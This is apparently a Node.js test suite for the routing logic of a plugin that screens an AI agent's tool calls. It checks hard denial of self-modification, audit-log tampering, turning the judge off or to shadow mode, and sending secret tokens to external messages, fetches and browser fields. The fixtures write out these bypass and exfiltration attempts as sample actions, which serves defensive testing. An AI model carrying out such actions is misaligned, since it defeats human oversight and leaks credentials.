import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import {
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { POLICY_VERSION } from '../src/constants.js';
import { assessPolicyRoute } from '../src/policy-routing.js';
import { redactForJudgeWithProvenance } from '../src/redact.js';

// macOS exposes os.tmpdir() through the /var -> /private/var alias. The policy
// deliberately refuses symlink aliases, so keep the fixture's trusted root
// canonical and create explicit alias cases below.
const FIXTURE_ROOT = realpathSync(mkdtempSync(path.join(tmpdir(), 'llm-action-routing-')));
const PLUGIN_ROOT = path.join(FIXTURE_ROOT, 'installed');
const PLUGIN_ALIAS = path.join(FIXTURE_ROOT, 'installed-alias');
const FILE_ALIAS_IN = path.join(FIXTURE_ROOT, 'plugin-file-alias.js');
const OUTSIDE_ROOT = path.join(FIXTURE_ROOT, 'outside');
const PARENT_SYMLINK_ROOT = path.join(FIXTURE_ROOT, 'parent-symlink-root');
const AUDIT_PATH = path.join(FIXTURE_ROOT, 'audit', 'llm-action-judge.jsonl');

for (const relative of [
  'index.js',
  'openclaw.plugin.json',
  'package.json',
  'README.md',
  'src/plugin.js',
  'src/redact.js',
  'schemas/judge-verdict.schema.json',
  'test/plugin.test.js',
]) {
  const target = path.join(PLUGIN_ROOT, relative);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, `${relative}\n`, 'utf8');
}
mkdirSync(OUTSIDE_ROOT, { recursive: true });
writeFileSync(path.join(OUTSIDE_ROOT, 'prompt.js'), 'outside\n', 'utf8');
writeFileSync(path.join(OUTSIDE_ROOT, 'plugin.js'), 'outside\n', 'utf8');
symlinkSync(path.join(OUTSIDE_ROOT, 'prompt.js'), path.join(PLUGIN_ROOT, 'src', 'prompt.js'));
symlinkSync(PLUGIN_ROOT, PLUGIN_ALIAS);
symlinkSync(path.join(PLUGIN_ROOT, 'src', 'plugin.js'), FILE_ALIAS_IN);
mkdirSync(PARENT_SYMLINK_ROOT, { recursive: true });
symlinkSync(OUTSIDE_ROOT, path.join(PARENT_SYMLINK_ROOT, 'src'));

after(() => rmSync(FIXTURE_ROOT, { recursive: true, force: true }));

function action(toolName, params, overrides = {}) {
  return {
    policy_version: POLICY_VERSION,
    tool_name: toolName,
    params,
    agent_id: 'agent-1',
    session_key: 'agent:main:main',
    run_id: 'run-1',
    tool_call_id: 'call-1',
    ...overrides,
  };
}

function assess(toolName, params, overrides = {}, trustedPaths = {}) {
  const localAction = action(toolName, params, overrides);
  return assessPolicyRoute({
    action: localAction,
    pluginRoot: trustedPaths.pluginRoot ?? PLUGIN_ROOT,
    auditPath: trustedPaths.auditPath ?? AUDIT_PATH,
    redaction: redactForJudgeWithProvenance(params),
  });
}

function expected(overrides = {}) {
  return {
    route: 'judge',
    hard_boundary: null,
    safe_path_candidate: false,
    safe_path_family: null,
    ...overrides,
  };
}

test('returns a frozen exact closed routing record', () => {
  const result = assess('read', { path: '/tmp/status' });
  assert.deepEqual(result, expected());
  assert.deepEqual(Object.keys(result), [
    'route',
    'hard_boundary',
    'safe_path_candidate',
    'safe_path_family',
  ]);
  assert.equal(Object.isFrozen(result), true);
});

test('hard-denies exact runtime self-modification and the exact audit file', () => {
  const cases = [
    ['write', { path: `${PLUGIN_ROOT}/index.js`, content: 'export default {}' }],
    ['edit', {
      path: `${PLUGIN_ROOT}/src/plugin.js`,
      edits: [{ oldText: 'safe', newText: 'disabled' }],
    }],
    ['apply_patch', {
      input: `*** Begin Patch\n*** Update File: ${PLUGIN_ROOT}/openclaw.plugin.json\n@@\n-old\n+new\n*** End Patch`,
    }],
    ['write', { path: `${PLUGIN_ROOT}/package.json`, content: '{}' }],
    ['edit', {
      path: `${PLUGIN_ROOT}/schemas/judge-verdict.schema.json`,
      edits: [{ oldText: 'allow', newText: 'anything' }],
    }],
    ['write', { path: AUDIT_PATH, content: '' }],
    ['edit', { path: AUDIT_PATH, edits: [{ oldText: 'deny', newText: 'allow' }] }],
    ['apply_patch', {
      input: `*** Begin Patch\n*** Delete File: ${AUDIT_PATH}\n*** End Patch`,
    }],
  ];

  for (const [toolName, params] of cases) {
    assert.deepEqual(assess(toolName, params), expected({
      route: 'hard_deny',
      hard_boundary: 'self_modification',
    }), `${toolName}: ${JSON.stringify(params)}`);
  }
});

test('keeps similar, harmless, relative, traversal and ambiguous file targets with the judge', () => {
  const cases = [
    ['write', { path: `${PLUGIN_ROOT}-copy/src/plugin.js`, content: 'x' }],
    ['write', { path: `${PLUGIN_ROOT}/README.md`, content: 'docs' }],
    ['write', { path: `${PLUGIN_ROOT}/test/plugin.test.js`, content: 'test' }],
    ['write', { path: `${PLUGIN_ROOT}/src/not-shipped.js`, content: 'scratch' }],
    ['write', { path: `${PLUGIN_ROOT}/schemas/scratch.json`, content: '{}' }],
    ['write', { path: 'src/plugin.js', content: 'x' }],
    ['edit', { path: `${PLUGIN_ROOT}/src/../src/plugin.js`, oldText: 'a', newText: 'b' }],
    ['edit', { path: `${PLUGIN_ROOT}/src/plugin.js`, oldText: 'a', newText: 'b' }],
    ['edit', { path: `${PLUGIN_ROOT}/src/plugin.js`, edits: [] }],
    ['edit', { path: `${PLUGIN_ROOT}/src/plugin.js`, edits: [{ oldText: 'a', newText: 'b', extra: true }] }],
    ['write', { path: `${PLUGIN_ROOT}/index.js`, content: 'x', extra: true }],
    ['apply_patch', { input: '*** Begin Patch\n*** Update File: src/plugin.js\n*** End Patch' }],
    ['apply_patch', {
      input: `*** Begin Patch\n*** Update File: ${PLUGIN_ROOT}/src/plugin.js\n*** Update File: relative.js\n*** End Patch`,
    }],
    ['apply_patch', { input: `mentions ${PLUGIN_ROOT}/src/plugin.js without a patch target` }],
  ];
  for (const [toolName, params] of cases) {
    assert.deepEqual(assess(toolName, params), expected(), `${toolName}: ${JSON.stringify(params)}`);
  }
});

test('keeps symlink aliases with the judge instead of proving a literal shipped target', () => {
  assert.deepEqual(assess('write', {
    path: `${PLUGIN_ALIAS}/src/plugin.js`,
    content: 'alias to installed file',
  }), expected());
  assert.deepEqual(assess('write', {
    path: FILE_ALIAS_IN,
    content: 'leaf alias to installed file',
  }), expected());

  for (const [params, trustedPaths] of [
    [{ path: `${PLUGIN_ROOT}/src/prompt.js`, content: 'leaf symlink out' }, {}],
    [{ path: `${PARENT_SYMLINK_ROOT}/src/plugin.js`, content: 'parent symlink out' }, {
      pluginRoot: PARENT_SYMLINK_ROOT,
    }],
    [{ path: `${PLUGIN_ROOT}/src/context-store.js`, content: 'missing shipped file' }, {}],
  ]) {
    assert.deepEqual(assess('write', params, {}, trustedPaths), expected(), JSON.stringify(params));
  }
});

test('matches the stock apply_patch grammar before proving protected targets', () => {
  const validInputs = [
    `  *** Begin Patch  \n  *** Update File: ${PLUGIN_ROOT}/src/plugin.js  \n@@\n-old\n+new\n  *** End Patch  `,
    `<<EOF\n*** Begin Patch\n*** Delete File: ${AUDIT_PATH}\n*** End Patch\nEOF`,
    `<<'EOF'\n*** Begin Patch\n*** Add File: ${PLUGIN_ROOT}/index.js\n+replacement\n*** End Patch\nEOF`,
    `<<"EOF"\n*** Begin Patch\n*** Update File: ${PLUGIN_ROOT}/src/redact.js\n@@ section\n-old\n+new\n*** End Patch\nwrapped EOF`,
  ];
  for (const input of validInputs) {
    assert.deepEqual(assess('apply_patch', { input }), expected({
      route: 'hard_deny',
      hard_boundary: 'self_modification',
    }), input);
  }

  const invalidInputs = [
    `*** Begin Patch\n*** Update File: ${PLUGIN_ROOT}/src/plugin.js\nnot-a-valid-update-line\n*** End Patch`,
    `*** Begin Patch\n*** Update File: ${PLUGIN_ROOT}/src/plugin.js\n*** End Patch`,
    `*** Begin Patch\n*** Add File: ${PLUGIN_ROOT}/index.js\nnot-an-add-line\n*** End Patch`,
    `<<EOF\n*** Begin Patch\n*** Delete File: ${AUDIT_PATH}\n*** End Patch\nWRONG`,
  ];
  for (const input of invalidInputs) {
    assert.deepEqual(assess('apply_patch', { input }), expected(), input);
  }
});

test('hard-denies a proven secret only in exact transmitted external sink fields', () => {
  const secret = 'api_token=route-fixture-never-send-5f8';
  const cases = [
    ['message', { action: 'send', target: 'ops', message: secret }],
    ['message', {
      action: 'send',
      channel: 'telegram',
      accountId: 'default',
      replyTo: '42',
      threadId: '7',
      message: secret,
      silent: true,
    }],
    ['message', {
      action: 'send',
      targets: ['ops', 'security'],
      media: 'https://example.test/status.png',
      caption: secret,
      dryRun: false,
    }],
    ['message', {
      action: 'send',
      target: 'ops',
      attachments: [{ type: 'file', media: `data:text/plain,${secret}`, name: 'status.txt' }],
    }],
    ['web_fetch', { url: `https://example.test/collect?${secret}` }],
    ['web_fetch', {
      url: `https://example.test/collect?${secret}`,
      extractMode: 'text',
      maxChars: 100,
    }],
    ['browser', { action: 'open', targetUrl: `https://example.test/?${secret}` }],
    ['browser', { action: 'navigate', target: 'sandbox', targetUrl: `https://example.test/?${secret}` }],
    ['browser', {
      action: 'navigate',
      target: 'node',
      node: 'browser-node',
      profile: 'openclaw',
      targetId: 't1',
      timeoutMs: 1_000,
      url: `https://example.test/?${secret}`,
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      request: { kind: 'type', ref: 'token', text: secret },
    }],
    ['browser', {
      action: 'act',
      node: 'browser-node',
      profile: 'openclaw',
      targetId: 't1',
      request: {
        kind: 'type',
        selector: '#token',
        text: secret,
        submit: true,
        slowly: false,
        timeoutMs: 1_000,
      },
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      kind: 'type',
      ref: 'token',
      text: secret,
    }],
  ];
  for (const [toolName, params] of cases) {
    assert.deepEqual(assess(toolName, params), expected({
      route: 'hard_deny',
      hard_boundary: 'secret_external_sink',
    }), `${toolName}: ${JSON.stringify(params)}`);
  }
});

test('does not infer exfiltration from literal markers, metadata, dry-run or near-miss shapes', () => {
  const secret = 'api_token=metadata-only-fixture-6a9';
  const cases = [
    ['message', { action: 'send', target: 'ops', message: '[REDACTED]' }],
    ['message', { action: 'send', target: 'ops', message: 'Bearer [TRUNCATED]' }],
    ['message', { action: 'send', target: 'ops', message: 'Bearer [REDACTED PRIVATE KEY]' }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      request: { kind: 'type', ref: 'token', text: 'Bearer [TRUNCATED]' },
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      kind: 'type',
      ref: 'token',
      text: 'Bearer [REDACTED PRIVATE KEY]',
    }],
    ['message', { action: 'send', target: 'ops', message: 'status', profile: secret }],
    ['message', { action: 'send', target: 'ops', message: secret, dryRun: true }],
    ['message', { action: 'send', target: 'ops', message: secret, dryRun: 'false' }],
    ['message', { action: 'draft', target: 'ops', message: secret }],
    ['message', { action: 'send', target: 'ops', content: secret }],
    ['message', { action: 'send' }],
    ['message', { action: 'send', message: secret, target: 42 }],
    ['message', { action: 'send', message: secret, targets: ['ops', 42] }],
    ['message', { action: 'send', message: secret, unknownStockField: true }],
    ['message', {
      action: 'send',
      attachments: [{ type: 'unknown', media: secret }],
    }],
    ['web_fetch', { url: 'https://example.test/status', note: secret }],
    ['web_fetch', { url: `https://example.test/?${secret}`, extractMode: 'html' }],
    ['web_fetch', { url: `https://example.test/?${secret}`, maxChars: 99 }],
    ['web_fetch', { url: `https://example.test/status#${secret}` }],
    ['web_fetch', { uri: `https://example.test/?${secret}` }],
    ['browser', { action: 'navigate', target: 'sandbox', url: 'https://example.test/', note: secret }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      request: { kind: 'click', ref: 'submit', text: secret },
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      request: { kind: 'type', ref: 'token', text: secret, extra: true },
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      kind: 'type',
      ref: 'token',
      text: secret,
      extra: true,
    }],
    ['browser', {
      action: 'act',
      target: 'node',
      node: 42,
      request: { kind: 'type', ref: 'token', text: secret },
    }],
    ['browser', {
      action: 'act',
      request: { kind: 'type', text: secret, submit: true },
    }],
  ];
  for (const [toolName, params] of cases) {
    assert.deepEqual(assess(toolName, params), expected(), `${toolName}: ${JSON.stringify(params)}`);
  }
});

test('a real bearer token before a literal marker remains a proven external secret', () => {
  for (const [toolName, params] of [
    ['message', {
      action: 'send',
      target: 'ops',
      message: 'Bearer route-real-secret-7b0 [TRUNCATED]',
    }],
    ['browser', {
      action: 'act',
      target: 'sandbox',
      request: {
        kind: 'type',
        ref: 'token',
        text: 'Bearer route-real-secret-7b0 [REDACTED PRIVATE KEY]',
      },
    }],
  ]) {
    assert.deepEqual(assess(toolName, params), expected({
      route: 'hard_deny',
      hard_boundary: 'secret_external_sink',
    }));
  }
});

test('hard-denies exact typed current and legacy judge boundary disable operations', () => {
  assert.deepEqual(assess('gateway', {
    action: 'config.set',
    path: 'plugins.entries.llm-action-judge.enabled',
    value: false,
  }), expected({ route: 'hard_deny', hard_boundary: 'security_boundary_bypass' }));

  const strictPatch = '{"plugins":{"entries":{"llm-action-judge":{"enabled":false}}}}';
  for (const params of [
    { action: 'config.patch', raw: strictPatch },
    { action: 'config.patch', raw: strictPatch, baseHash: 'sha256:fixture', note: 'disable' },
    {
      action: 'config.patch',
      raw: ' {\n  "plugins": { "entries": { "llm-action-judge": { "enabled": false } } }\n} ',
      delayMs: 0,
      reason: 'policy maintenance',
      continuationMessage: 'continue after restart',
      restartDelayMs: 0,
    },
    {
      action: 'config.patch',
      raw: '{"plugins":{"entries":{"llm-action-judge":{"config":{"enforcement":"shadow"}}}}}',
    },
    {
      action: 'config.apply',
      raw: '{"agents":{},"plugins":{"entries":{"llm-action-judge":{"enabled":false}}}}',
    },
    {
      action: 'config.apply',
      raw: '{"agents":{},"plugins":{"entries":{}}}',
    },
  ]) {
    assert.deepEqual(assess('gateway', params), expected({
      route: 'hard_deny',
      hard_boundary: 'security_boundary_bypass',
    }), JSON.stringify(params));
  }

  for (const params of [
    { action: 'config.set', path: 'plugins.entries.llm-action-judge.enabled', value: true },
    { action: 'config.set', path: 'plugins.entries.other.enabled', value: false },
    { action: 'config.get', path: 'plugins.entries.llm-action-judge.enabled' },
    { action: 'config.set', path: 'plugins.entries.llm-action-judge', value: false },
    { action: 'config.patch', raw: '{ plugins: { entries: { "llm-action-judge": { enabled: false } } } }' },
    { action: 'config.patch', raw: '{"plugins":{"entries":{"llm-action-judge":{"enabled":false}}}}', extra: true },
    { action: 'config.patch', raw: 1 },
    { action: 'config.patch', raw: '{"plugins":{"entries":{"llm-action-judge":{"enabled":true}}}}' },
    { action: 'config.patch', raw: '{"plugins":{"entries":{"llm-action-judge":{"enabled":false}}},"plugins":{}}' },
    {
      action: 'config.apply',
      raw: '{"plugins":{"entries":{"llm-action-judge":{"enabled":true,"config":{"enforcement":"enforce"}}}}}',
    },
    { action: 'config.patch', raw: strictPatch, delayMs: -1 },
    { action: 'config.patch', raw: strictPatch, reason: 1 },
    { action: 'config.patch', raw: strictPatch, continuationMessage: false },
  ]) {
    assert.deepEqual(assess('gateway', params), expected(), JSON.stringify(params));
  }

  assert.deepEqual(assess('gateway', {
    action: 'config.patch',
    raw: '{"plugins":{"entries":{"llm-action-judge":{"enabled":false,"mode":"shadow"},"other":{"enabled":true}}}}',
  }), expected({ route: 'hard_deny', hard_boundary: 'security_boundary_bypass' }));

  assert.deepEqual(assess('gateway', {
    action: 'config.set',
    path: 'plugins.entries.llm-action-judge.config.enforcement',
    value: 'shadow',
  }), expected({ route: 'hard_deny', hard_boundary: 'security_boundary_bypass' }));
});

test('generic elevated, production, destructive and bypass string mentions remain judge-routed', () => {
  const cases = [
    ['exec', { command: 'rm -rf /tmp/cache' }],
    ['exec', { command: 'deploy production', elevated: true, host: 'gateway' }],
    ['write', { path: '/srv/app/config.production.json', content: '{}' }],
    ['write', { path: '/tmp/notes.md', content: 'use --dangerously-skip-permissions' }],
    ['message', { action: 'send', target: 'ops', message: 'disable the judge later', dryRun: true }],
  ];
  for (const [toolName, params] of cases) {
    assert.deepEqual(assess(toolName, params), expected(), `${toolName}: ${JSON.stringify(params)}`);
  }
});

test('marks only exact current session status shapes as safe-path candidates', () => {
  for (const params of [{}, { sessionKey: 'current' }, { sessionKey: 'agent:main:main' }]) {
    assert.deepEqual(assess('session_status', params), expected({
      safe_path_candidate: true,
      safe_path_family: 'session_status_current',
    }), JSON.stringify(params));
  }

  for (const params of [
    { model: 'cloudru/other' },
    { model: null },
    { sessionKey: 'agent:other:main' },
    { sessionKey: 'current', extra: true },
    { sessionKey: 1 },
  ]) {
    assert.deepEqual(assess('session_status', params), expected(), JSON.stringify(params));
  }
});

test('marks only exact bounded sandbox browser wait shapes as safe-path candidates', () => {
  const safe = [
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: 0 } },
    { action: 'act', target: 'sandbox', profile: 'openclaw', request: { kind: 'wait', timeMs: 30_000 } },
    { action: 'act', target: 'sandbox', kind: 'wait', timeMs: 100 },
  ];
  for (const params of safe) {
    assert.deepEqual(assess('browser', params), expected({
      safe_path_candidate: true,
      safe_path_family: 'browser_wait',
    }), JSON.stringify(params));
  }

  const unsafe = [
    { action: 'act', target: 'host', request: { kind: 'wait', timeMs: 100 } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait' } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: -1 } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: 30_001 } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: 1.5 } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: 100, selector: '#x' } },
    { action: 'act', target: 'sandbox', request: { kind: 'wait', timeMs: 100 }, extra: true },
    { action: 'act', target: 'sandbox', kind: 'wait', timeMs: 100, extra: true },
    {
      action: 'act',
      target: 'sandbox',
      profile: '[REDACTED]',
      request: { kind: 'wait', timeMs: 100 },
    },
    {
      action: 'act',
      target: 'sandbox',
      profile: `${'x'.repeat(4_096)}[TRUNCATED]`,
      request: { kind: 'wait', timeMs: 100 },
    },
  ];
  for (const params of unsafe) {
    assert.deepEqual(assess('browser', params), expected(), JSON.stringify(params));
  }
});

test('rejects a redaction record not exactly bound to action params', () => {
  const localAction = action('session_status', {});
  const valid = redactForJudgeWithProvenance({});
  const invalidRecords = [
    { ...valid, opaque: true },
    { ...valid, value: { injected: true } },
    { ...valid, extra: true },
    Object.defineProperty({ ...valid }, 'opaque', { enumerable: true, get() { return false; } }),
  ];
  const symbolRecord = { ...valid };
  symbolRecord[Symbol('extra')] = true;
  invalidRecords.push(symbolRecord);

  for (const redaction of invalidRecords) {
    assert.throws(
      () => assessPolicyRoute({
        action: localAction,
        pluginRoot: PLUGIN_ROOT,
        auditPath: AUDIT_PATH,
        redaction,
      }),
      (error) => error instanceof TypeError && error.message === 'invalid policy route input',
    );
  }
});

test('rejects malformed trusted paths and non-exact action or option envelopes', () => {
  const validAction = action('session_status', {});
  const validRedaction = redactForJudgeWithProvenance({});
  const cases = [
    { action: validAction, pluginRoot: 'relative/plugin', auditPath: AUDIT_PATH, redaction: validRedaction },
    { action: validAction, pluginRoot: `${PLUGIN_ROOT}/../llm-action-judge`, auditPath: AUDIT_PATH, redaction: validRedaction },
    { action: validAction, pluginRoot: PLUGIN_ROOT, auditPath: 'relative/audit.jsonl', redaction: validRedaction },
    { action: validAction, pluginRoot: PLUGIN_ROOT, auditPath: '/var/log/../log/judge.jsonl', redaction: validRedaction },
    {
      action: { ...validAction, extra: true },
      pluginRoot: PLUGIN_ROOT,
      auditPath: AUDIT_PATH,
      redaction: validRedaction,
    },
    {
      action: validAction,
      pluginRoot: PLUGIN_ROOT,
      auditPath: AUDIT_PATH,
      redaction: validRedaction,
      extra: true,
    },
  ];
  const symbolAction = { ...validAction };
  symbolAction[Symbol('extra')] = true;
  cases.push({
    action: symbolAction,
    pluginRoot: PLUGIN_ROOT,
    auditPath: AUDIT_PATH,
    redaction: validRedaction,
  });

  for (const input of cases) {
    assert.throws(
      () => assessPolicyRoute(input),
      (error) => error instanceof TypeError && error.message === 'invalid policy route input',
    );
  }
});

test('fails closed on untrusted assessment envelopes without invoking accessors or proxies', () => {
  let getterCalls = 0;
  const accessorAction = action('session_status', {});
  Object.defineProperty(accessorAction, 'params', {
    enumerable: true,
    get() {
      getterCalls += 1;
      return {};
    },
  });
  const proxyAction = new Proxy(action('session_status', {}), {
    get() { throw new Error('route-secret-never-leak'); },
  });

  for (const hostileAction of [accessorAction, proxyAction]) {
    assert.throws(
      () => assessPolicyRoute({
        action: hostileAction,
        pluginRoot: PLUGIN_ROOT,
        auditPath: AUDIT_PATH,
        redaction: redactForJudgeWithProvenance({}),
      }),
      (error) => error instanceof TypeError
        && error.message === 'invalid policy route input'
        && !error.message.includes('route-secret-never-leak'),
    );
  }
  assert.equal(getterCalls, 0);
});

test('fails closed rather than upgrading a route after runtime intrinsic mutation', () => {
  const localAction = action('write', { path: `${PLUGIN_ROOT}/index.js`, content: 'blocked' });
  const redaction = redactForJudgeWithProvenance(localAction.params);
  const cases = [
    [Set.prototype, 'has', () => false],
    [Array.prototype, 'includes', () => false],
    [String.prototype, 'startsWith', () => false],
  ];

  for (const [owner, key, replacement] of cases) {
    const descriptor = Object.getOwnPropertyDescriptor(owner, key);
    Object.defineProperty(owner, key, { ...descriptor, value: replacement });
    try {
      assert.throws(
        () => assessPolicyRoute({ action: localAction, pluginRoot: PLUGIN_ROOT, auditPath: AUDIT_PATH, redaction }),
        (error) => error instanceof TypeError && error.message === 'invalid policy route input',
        `${owner.constructor.name}.${key}`,
      );
    } finally {
      Object.defineProperty(owner, key, descriptor);
    }
  }
});

test('fails closed when URL accessors or global constructors are replaced', () => {
  const localAction = action('web_fetch', { url: 'https://example.test/?api_token=blocked' });
  const redaction = redactForJudgeWithProvenance(localAction.params);
  const input = { action: localAction, pluginRoot: PLUGIN_ROOT, auditPath: AUDIT_PATH, redaction };

  const protocol = Object.getOwnPropertyDescriptor(URL.prototype, 'protocol');
  Object.defineProperty(URL.prototype, 'protocol', { ...protocol, get() { return 'file:'; } });
  try {
    assert.throws(
      () => assessPolicyRoute(input),
      (error) => error instanceof TypeError && error.message === 'invalid policy route input',
    );
  } finally {
    Object.defineProperty(URL.prototype, 'protocol', protocol);
  }

  const originalSet = globalThis.Set;
  globalThis.Set = class HostileSet {};
  try {
    assert.throws(
      () => assessPolicyRoute(input),
      (error) => error instanceof TypeError && error.message === 'invalid policy route input',
    );
  } finally {
    globalThis.Set = originalSet;
  }

  const stringify = JSON.stringify;
  JSON.stringify = () => '{}';
  try {
    assert.throws(
      () => assessPolicyRoute(input),
      (error) => error instanceof TypeError && error.message === 'invalid policy route input',
    );
  } finally {
    JSON.stringify = stringify;
  }
});
